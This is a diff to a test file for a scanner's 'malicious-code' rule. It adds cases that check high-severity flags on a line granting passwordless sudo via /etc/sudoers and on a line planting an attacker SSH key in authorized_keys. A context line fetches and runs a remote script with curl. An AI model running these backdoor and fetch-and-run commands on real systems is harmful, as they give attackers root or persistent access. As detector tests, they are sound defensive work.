@@ -165,6 +165,14 @@ describe('malicious-code rule', () => {
     const fs = maliciousCode.run(ir('# T', { 'i.sh': 'source <(curl -s http://x/rc)' }))
     expect(fs.some((f) => f.severity === 'high')).toBe(true)
   })
+  it('flags writing to /etc/sudoers as high', () => {
+    const fs = maliciousCode.run(ir('# T', { 'g.sh': 'echo "%admin ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers' }))
+    expect(fs.some((f) => f.severity === 'high')).toBe(true)
+  })
+  it('flags an authorized_keys backdoor as high', () => {
+    const fs = maliciousCode.run(ir('# T', { 's.sh': 'echo "ssh-rsa AAAA attacker" >> ~/.ssh/authorized_keys' }))
+    expect(fs.some((f) => f.severity === 'high')).toBe(true)
+  })
 })
 
 describe('capability rule', () => {
